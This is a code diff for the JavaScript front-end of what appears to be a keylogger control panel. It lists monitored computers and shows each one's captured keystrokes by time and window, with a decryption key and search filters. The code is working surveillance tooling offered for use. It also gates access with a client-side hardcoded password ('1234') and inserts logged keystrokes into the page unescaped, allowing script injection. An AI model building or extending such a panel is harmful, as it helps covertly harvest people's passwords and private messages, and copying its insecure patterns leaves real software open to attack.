@@ -1,36 +1,73 @@
-document.addEventListener('DOMContentLoaded', function() {
-    const computersTableBody = document.getElementById('computersTable').querySelector('tbody');
-    const keystrokesSection = document.getElementById('keystrokesSection');
+document.addEventListener('DOMContentLoaded', function () {
+    const loginForm = document.getElementById('loginForm');
+    const loginPage = document.getElementById('loginPage');
+    const mainPage = document.getElementById('mainPage');
+    const decryptionKeyInput = document.getElementById('decryptKey');
+    const computersContainer = document.getElementById('computersContainer');
+    const modal = document.getElementById('keystrokesModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const closeModal = document.querySelector('.close-modal');
     const keystrokesTableBody = document.getElementById('keystrokesTable').querySelector('tbody');
-    const computerNameSpan = document.getElementById('computerName');
+    const toggleFilterBtn = document.getElementById('toggleFilter');
     const filterForm = document.getElementById('filterForm');
+    const applyFilterBtn = document.getElementById('applyFilter');
+    const clearFilterBtn = document.getElementById('clearFilter');
+    let sortDirection = {};
 
+    loginForm.addEventListener('submit', function (event) {
+        event.preventDefault();
+        const password = document.getElementById('password').value;
+        if (password === '1234') {
+            loginPage.style.display = 'none';
+            mainPage.style.display = 'block';
+            fetchComputers();
+        } else {
+            alert('Incorrect password. Please try again.');
+        }
+    });
+
+    /** Fetch all available computers and update the grid */
     function fetchComputers() {
         fetch('/api/machines')
             .then(response => response.json())
             .then(data => {
-                computersTableBody.innerHTML = '';
+                computersContainer.innerHTML = '';
                 data.machines.forEach(machine => {
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td>${machine}</td>
-                        <td><button onclick="fetchKeystrokes('${machine}')">View Keystrokes</button></td>
-                    `;
-                    computersTableBody.appendChild(row);
+                    const computerCard = document.createElement('div');
+                    computerCard.classList.add('computer-card');
+                    computerCard.innerHTML = `<h3>${machine}</h3>`;
+                    computerCard.addEventListener('click', () => openKeystrokesModal(machine));
+                    computersContainer.appendChild(computerCard);
                 });
             })
             .catch(error => console.error('Error fetching computers:', error));
     }
 
-    window.fetchKeystrokes = function(machine) {
+    /** Open Keystrokes Modal */
+    function openKeystrokesModal(machine) {
+        modal.style.display = 'block';
+        modalTitle.textContent = `Keystrokes for ${machine}`;
+        fetchKeystrokes(machine);
+    }
+
+    /** Fetch Keystrokes for a machine using a user-supplied decryption key */
+    function fetchKeystrokes(machine) {
+        const userKey = decryptionKeyInput.value.trim(); // Get user-entered key
+        if (!userKey) {
+            alert("Please enter a decryption key.");
+            return;
+        }
+
+        let url = `/api/get_keystrokes?machine=${encodeURIComponent(machine)}&key=${encodeURIComponent(userKey)}`;
+
+        // Append filters if provided
         const date = document.getElementById('filterDate').value;
         const windowName = document.getElementById('filterWindow').value;
         const searchText = document.getElementById('filterText').value;
 
-        let url = `/api/get_keystrokes?machine=${machine}`;
-        if (date) url += `&date=${date}`;
-        if (windowName) url += `&window=${windowName}`;
-        if (searchText) url += `&searchText=${searchText}`;
+        if (date) url += `&date=${encodeURIComponent(date)}`;
+        if (windowName) url += `&window=${encodeURIComponent(windowName)}`;
+        if (searchText) url += `&searchText=${encodeURIComponent(searchText)}`;
 
         fetch(url)
             .then(response => response.json())
@@ -39,57 +76,68 @@ document.addEventListener('DOMContentLoaded', function() {
                     alert(data.error);
                     return;
                 }
-                computerNameSpan.textContent = machine;
                 keystrokesTableBody.innerHTML = '';
                 for (const [timestamp, windows] of Object.entries(data.logs)) {
                     for (const [window, keystrokes] of Object.entries(windows)) {
                         const row = document.createElement('tr');
-                        row.innerHTML = `
-                            <td>${timestamp}</td>
-                            <td>${window}</td>
-                            <td>${keystrokes}</td>
-                        `;
+                        row.innerHTML = `<td>${timestamp}</td><td>${window}</td><td>${keystrokes}</td>`;
                         keystrokesTableBody.appendChild(row);
                     }
                 }
-                keystrokesSection.style.display = 'block';
             })
             .catch(error => console.error('Error fetching keystrokes:', error));
-    };
+    }
 
-    document.getElementById('refreshButton').addEventListener('click', fetchComputers);
-    filterForm.addEventListener('submit', function(event) {
-        event.preventDefault();
-        const machine = computerNameSpan.textContent;
-        if (machine) {
-            fetchKeystrokes(machine);
-        }
+    /** Toggle Filter Form Visibility */
+    toggleFilterBtn.addEventListener('click', () => {
+        filterForm.classList.toggle('hidden');
     });
 
-    fetchComputers();
-});
+    /** Apply Filters */
+    applyFilterBtn.addEventListener('click', (event) => {
+        event.preventDefault();
+        fetchKeystrokes(modalTitle.textContent.split(" ")[2]);
+    });
 
-// document.getElementById('searchForm').addEventListener('submit', function(event) {
-//     event.preventDefault();
-//     const computer = document.getElementById('computerSelect').value;
-//     const date = document.getElementById('date').value;
-//     const searchText = document.getElementById('searchText').value;
-//     fetch(`/api/get_keystrokes?machine=${computer}&date=${date}`)
-//         .then(response => response.json())
-//         .then(data => {
-//             const resultDiv = document.getElementById('result');
-//             if (data.error) {
-//                 resultDiv.innerHTML = `<p>Error: ${data.error}</p>`;
-//             } else {
-//                 let logs = JSON.stringify(data.logs, null, 2);
-//                 if (searchText) {
-//                     const regex = new RegExp(searchText, 'gi');
-//                     logs = logs.replace(regex, match => `<mark>${match}</mark>`);
-//                 }
-//                 resultDiv.innerHTML = `<h2>Logs for ${data.machine} on ${data.date}</h2><pre>${logs}</pre>`;
-//             }
-//         })
-//         .catch(error => {
-//             console.error('Error fetching data:', error);
-//         });
-// });
+    /** Clear Filters */
+    clearFilterBtn.addEventListener('click', (event) => {
+        event.preventDefault();
+        document.getElementById('filterDate').value = '';
+        document.getElementById('filterWindow').value = '';
+        document.getElementById('filterText').value = '';
+        fetchKeystrokes(modalTitle.textContent.split(" ")[2]);
+    });
+
+    /** Close Modal */
+    closeModal.addEventListener('click', () => {
+        modal.style.display = 'none';
+    });
+
+    /** Refresh Button */
+    document.getElementById('refreshButton').addEventListener('click', fetchComputers);
+
+    /** Sorting Table Columns */
+    document.querySelectorAll("#keystrokesTable th").forEach(header => {
+        header.addEventListener('click', () => {
+            const column = header.getAttribute("data-sort");
+            if (!column) return;
+
+            sortDirection[column] = sortDirection[column] === 'asc' ? 'desc' : 'asc';
+
+            const rows = Array.from(keystrokesTableBody.querySelectorAll('tr'));
+
+            rows.sort((rowA, rowB) => {
+                const cellA = rowA.cells[header.cellIndex].textContent.trim();
+                const cellB = rowB.cells[header.cellIndex].textContent.trim();
+
+                if (column === "timestamp") {
+                    return sortDirection[column] === 'asc' ? new Date(cellA) - new Date(cellB) : new Date(cellB) - new Date(cellA);
+                }
+                return sortDirection[column] === 'asc' ? cellA.localeCompare(cellB) : cellB.localeCompare(cellA);
+            });
+
+            keystrokesTableBody.innerHTML = "";
+            rows.forEach(row => keystrokesTableBody.appendChild(row));
+        });
+    });
+});
